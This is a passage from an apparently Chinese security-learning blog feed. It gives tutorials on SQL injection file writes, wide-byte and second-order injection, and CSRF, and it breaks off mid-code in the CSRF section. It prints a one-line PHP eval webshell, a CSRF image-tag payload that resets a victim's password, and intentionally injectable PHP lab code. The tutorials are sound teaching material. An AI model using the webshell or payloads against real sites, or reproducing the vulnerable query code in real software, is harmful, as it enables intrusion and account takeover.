src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/QQ.png" class="" title="PHP代码审计之代码执行漏洞">]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cmd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入漏洞之文件写入、宽字节注入及二次注入</title>
    <link href="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  这两天总是觉得自己失去了一些什么，静下来后才发觉之前学的一些东西已经忘了，这可不是一个好的征兆，所以，赶紧的把现在还记得而且没记录的东西记录起来才是正事，这一篇是记录SQL注入小技巧的文章。</p><p>参考文献：<a href="https://www.bilibili.com/video/av48675526/?p=7">水清云影老师的讲解视频</a></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  SQL注入技巧除了那些常见的注入方式之外，还有一些比较偏门的注入技巧，有一些是绕过方式的特殊，一些是利用方式的特殊。</p><h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="文件写入："></a>文件写入：</h3><p>  这是利用SQL语句中<code>into outfile</code>语句进行注入的一种方式，通过漏洞点将木马写入服务器的注入方式。假设站点下存在普通的SQL注入，代码举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">#sql.php<br>&lt;?php<br>$id&#x3D;$_GET[&#39;id&#39;];<br>$conn&#x3D;@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,NULL,&#39;erci2&#39;);<br>$sql&#x3D;&quot;SELECT * FROM USER WHERE id&#x3D;&#123;$id&#125;&quot;;<br>$result&#x3D;mysqli_query($conn,$sql) or die(mysqli_error($conn));<br>while($row&#x3D;mysqli_fetch_array($result))&#123;<br>  echo &quot;ID:&quot;.$row[&#39;id&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>  echo &quot;username:&quot;.$row[&#39;username&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>  echo &quot;password:&quot;.$row[&#39;password&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>  echo &quot;EMAIL:&quot;.$row[&#39;PHONE&#39;].&quot;&lt;br &#x2F;&gt;&quot;;<br>&#125;<br>mysqli_close($conn);<br>echo &quot;&lt;hr&gt;&quot;;<br>echo $sql;<br>?&gt;<br></code></pre></td></tr></table></figure><p>  正常的执行结果是这样的：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>从源代码中就可以看出来源码存在SQL报错注入，而且是数字型报错注入；没有过滤<code>into outfile</code>关键字，这就是产生SQL注入文件写入的前提，如果这里被人写入这样的语句：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/2.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>  虽然我用的是MAC，当我一直都搞不懂文件目录，不过在Windows可以直接用<code>F:/VHOST/www/con.php</code>就会在那个目录在站点目录下面生成一个php文件，根据我上面的语句，里面生成的内容就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#con.php</span><br><span class="hljs-number">2</span>CayceAtlantis<span class="hljs-number">18888888888</span><br><span class="hljs-number">1</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-number">3</span><span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>  这里会出现一句话木马是因为上面payload里面的16进制内容就是一句话木马。</p><h3 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h3><p>  先来谈谈宽字节的来源吧：一般的网站为了人性化，都会用到字符，字符集和字符序，而程序员在网站开发上处理这些字符的用的大多都是UTF-8编码，也就是位于ASCII码和UNICODE之间的中间编码，但有一些特殊的网站还会用到ASCII编码，而宽字节就是其中几类ASCII编码的特征，比如常见的有：GB2312、GBK、GB18030、BIG5、Shift_JIS等，这些编码都是由两个字节，也就是一个字组成。而款字节注入就是利用这个特性来吃掉被转义的ASCII字符（一个字节），而不影响代码的执行。代码举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sql.php</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=GBK&quot;</span>);<br><span class="hljs-variable">$id</span>=addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$conn</span>=@mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&#x27;erci2&#x27;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;SET NAMES &#x27;GBK&#x27;&quot;</span>);<br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error(<span class="hljs-variable">$conn</span>));<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHONE:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>&#125;<br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看一下正常SQL注入：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>再看一下宽字节注入方法：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/3.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>对比发现，正常闭合的单引号被转义了，而使用<code>%df&#39;</code>的方式闭合会出现一个‘運’字，这是因为原本转义单引号的<code>\</code>被吃掉了，组成一个宽字节字符。看这里的一张图</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/5.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>  走一下过程：MYSQL的编码被设置成宽字节型编码，php代码中使用的转义函数对接收的数据进行处理，payload中对闭合符号之前加入吃掉%5c的%df符号，在宽字节的编码下，形成一个被SQL语言忽略的汉字，绕过成功。</p><h3 id="二次注入："><a href="#二次注入：" class="headerlink" title="二次注入："></a>二次注入：</h3><p>  二次注入是因为程序员在编写后台代码的时候虽然精心处理了用户传过来的数据，但存储在数据库之中的数据还是跟用户输入的数据的一样，而数据在取出数据库的时候，就会被当作SQL语句执行，从而造成二次注入。代码举例一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sql.php 注册功能</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;constant-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br><span class="hljs-variable">$Username</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Username&#x27;</span>]);<br><span class="hljs-variable">$Password</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Password&#x27;</span>]);<br><span class="hljs-variable">$Phone</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Phone&#x27;</span>]);<br><span class="hljs-variable">$conn</span>=@mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&#x27;erci2&#x27;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into user(username,password,phone) values(&#x27;<span class="hljs-subst">&#123;$Username&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$Password&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$Phone&#125;</span>&#x27;)&quot;</span>;<br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error());<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>header(<span class="hljs-string">&#x27;location:1.php&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;SQL二阶注入&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-left: 35%;&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>Username:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;Username&quot;</span>&gt;&lt;br /&gt;<br>Password :&lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;Password&quot;</span>&gt;&lt;br /&gt;<br>Phone:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;Phone&quot;</span> style=<span class="hljs-string">&quot;margin-left: 3.3%&quot;</span>&gt;&lt;br /&gt;<br>&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> style=<span class="hljs-string">&quot;margin-left: 20%; color: #00f; background-color: #0af&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>注册之后可以在某一位置对数据进行查询获修改，代码举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#1.php 查询功能</span><br><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;constant-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$conn</span>=@mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&#x27;erci2&#x27;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error());<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-variable">$Username</span>=<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username=&#x27;<span class="hljs-subst">&#123;$Username&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(mysqli_error());<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Username&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Phone:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;SQL二阶注入&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-left: 35%;&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>search id:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span>&gt;&lt;br /&gt;<br>&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> style=<span class="hljs-string">&quot;margin-left: 20%; color: #00f; background-color: #0af&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>简单解释一下代码，在sql.php中用户可以将数据插入数据库，虽然传过来的数据被过滤了，不过写入的数据库的数据却被还原成用户输入的内容，在1.php中，查询的时候调用到shellcode，原本无害的数据被当作SQL命令执行，造成SQL二阶注入。过程演示，恶意用户构造ShellCode：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/6.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>这里传进去的Username原本会被addslashes($_POST[‘Username’])转义，不过在存入数据库的时候会被还原：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/7.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>之后在另一个界面调用到这个数据的时候如果没有经过处理，该数据就会被当成SQL命令执行：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/8.jpg" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入"><p>明显可以看出来，Username部分显示的跟用户创建的值不一样，而是数据被当作命令执行后的结果，这就是一个二次注入的SQL漏洞。</p><h5 id="防御方式："><a href="#防御方式：" class="headerlink" title="防御方式："></a>防御方式：</h5><p>对这三个漏洞，不管哪个，建议四步走：</p><ol><li>对用户输入的数据最好都用正则表达式将关键是全部都给过滤掉；</li><li>再使用mysqli_real_escape_sring()处理SQL执行语句；</li><li>对编码进行强制性要求，直接写死，不给机会；</li><li>不使用where语句，使用mysqli自带方法将每一步写死。</li></ol><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>  现在对于这三个漏洞能想起来的也就这么多，这还是在老师的讲解视频的帮助下。这应该算是SQL注入中的高级注入方式了，目前本人还只是菜鸟一枚，对其他的SQL偏门注入了解的不是很深，就不献丑了。如果我的理解还有什么不到位的地方，欢迎表哥表姐们批评教育，请走该通道：</p><img src="/2021/05/09/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/QQ.png" class="" title="SQL注入漏洞之文件写入、宽字节注入及二次注入">]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF和SSRF带来的WEB漏洞</title>
    <link href="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  前几天做了一波xss的总结，之后找到了进入第十五关的地址，不过在学习过程中，又看到了两个更加好玩漏洞利用，于是乎，打完xss练习平台后就迫不及待地学起来这个，也正好完成一波学长给布置的任务。就我个人的理解，CSRF就像是一块拥有诱惑力的蛋糕，吸引着一些没有足够网络安全意识的用户走入陷阱，而SSRF就像一个有着好几个不同的门的房间，连接着服务器上不同的权限。</p><p>参考文献：<a href="https://www.bilibili.com/video/av41286463?from=search&seid=2690147047869633725">半夏小哥哥的教学视频</a>、<a href="https://www.bilibili.com/video/av37393329/">倾旋小哥哥的教学视频</a></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  CSRF的全称是跨站请求伪造（Cross-site request forgery），是基于客户端操作的请求伪造，简单说，会话对象只有两个，攻击者利用正常的登录状态对网站内部对某些请求操作进行截取，并将其伪造成网页中具有某些诱惑效果的html代码链接，比如图片点击事件，这样其他用户在无意中点击该图片的时候就会触发该操作，当然这个是有前提的，用户必须要信任该网站，也就是利用用户保存在浏览器上的隐式验证，比如说cookie。</p><h3 id="CSRF实例："><a href="#CSRF实例：" class="headerlink" title="CSRF实例："></a>CSRF实例：</h3><p>  对于一些交互网站，一般都会有用户的登录界面和密码修改界面，如果说恶意用户制造了一个修改密码的URL(其实就是抓取修改密码时的请求)，并以其他的形式留在该网站上，比如说以<code>&lt;img src=&#39;shellcode&#39;&gt;</code>标签形式留在留言板上，这就会造成其他用户在无意中点击该标签的时候修改了自己的密码。这里有一张来自网上的图：</p><img src="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/1.png" class="" title="CSRF和SSRF带来的WEB漏洞"><p>大致来说的CSRF攻击步骤就如上图所示，这里在做一个简单的攻击实例：</p><img src="/2021/05/09/CSRF%E5%92%8CSSRF%E5%B8%A6%E6%9D%A5%E7%9A%84WEB%E6%BC%8F%E6%B4%9E/2.jpg" class="" title="CSRF和SSRF带来的WEB漏洞"><p>  在这个找回密码的界面中，我们需要提交三个参数才能完成密码的更新：<code>password</code>、<code>checkpassword</code>、<code>submit</code>，后台的过滤语句并没有对这三个参数进行严格的控制，造成这里的URL可直接访问，也就是CSRF触发的前提条件之一成立，所以就会有恶意用户在这里构造恶意语句：<code>&lt;img src=&#39;http://127.0.0.1:8080/CSRF&amp;SSRF/manage.php?password=admin&amp;checkpassword=admin&amp;submit=submit&#39;&gt;</code>，这条语句可以出现一些论坛之类等该用户经常访问的网站上，如果受害用户在登录该网站的时候同时点击了论坛上的该图片标签，他的网站密码就会被改成<code>admin</code>。当然这只是一个举例，CSRF还有更加危险的操作，例如对账户进行转账等危险操作，不过一般大型公司的网站是不允许有该漏洞存在的。</p><p>  因为这里的代码是个人坐实验用的，所以仅供参考：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php">界面部分<br>&lt;form action=<span class="hljs-string">&quot;GetNewPassword.php&quot;</span> method=<span class="hljs-string">&quot;GET&quot;</span>&gt;<br>  &lt;h3&gt;找回密码&lt;/h3&gt;<br>  NewPassword:&lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;br /&gt;<br>  ReNPassword:&lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;checkpassword&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;&lt;br /&gt;<br>  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; class=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br><br><br>后台处理<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]===<span class="hljs-string">&#x27;submit&#x27;</span>)&#123;<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;islogin&#x27;</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;checkpassword&quot;</span>])&amp;&amp;!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;checkpassword&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]===<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;checkpassword&#x27;</span>])&#123;<br><span class="hljs-comment">//数据库连接操作</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;mysqli.php&#x27;</span>;<br><span class="hljs-variable">$link</span>=mysqlconnect();<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users&quot;</span>;<br><span 